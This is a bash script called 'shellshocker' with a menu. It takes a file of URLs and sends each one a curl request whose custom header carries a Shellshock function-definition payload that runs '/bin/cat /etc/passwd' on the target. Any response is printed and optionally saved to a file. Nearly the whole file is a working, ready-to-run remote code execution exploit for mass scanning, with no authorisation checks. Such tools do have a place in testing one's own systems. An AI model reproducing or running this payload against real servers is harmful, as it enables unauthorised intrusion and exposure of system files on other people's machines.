#!/bin/bash

function usage(){ 
    printf "%b \a\n\nSelect the 'List' option to specify a path to a list of URLs to be tested, in example 'Path to list: /tmp/list.txt', 
after doing so you can select the 'Output' option to specify a location to which a copy of the script's output will be saved. 
This option is not mandatory however and output will be printed to the terminal regardless of whether it is set or not.

Finally after a list of URLs has been loaded you can test them for the shellshock vulnerability by selecting the 'Test' option. 
If any given host is vulnerable the contents of their /etc/passwd will be retrieved and printed to the terminal.
Upon completion the script will exit.
\n" 
    }


printf "%b" "\a\n\nTo use shellshocker please select an option below, select the 'Help' option for details on the script's functionality:\n"

PS3='Please enter your choice: '
options=("Output" "List" "Test" "Help" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Output")
            read -p 'Location to save output to: ' outfile
            printf "%b \n"
            ;;
        "List")
            read -p 'Path to list: ' list
            printf "%b \n"
            ;;
        "Test")
            if [ "$list" == "" ]; then
                echo "To test a list of URLs one needs to be supplied via the 'List' option"
                printf "%b \n"
            else
                cat $list | xargs -I % bash -c 'curl % -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" && echo ----END OF RESPONSE----' | tee $outfile
                printf "%b \a\n\n Done, exiting.\n"
                break
            fi
            ;;
        "Help")
            usage
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done 
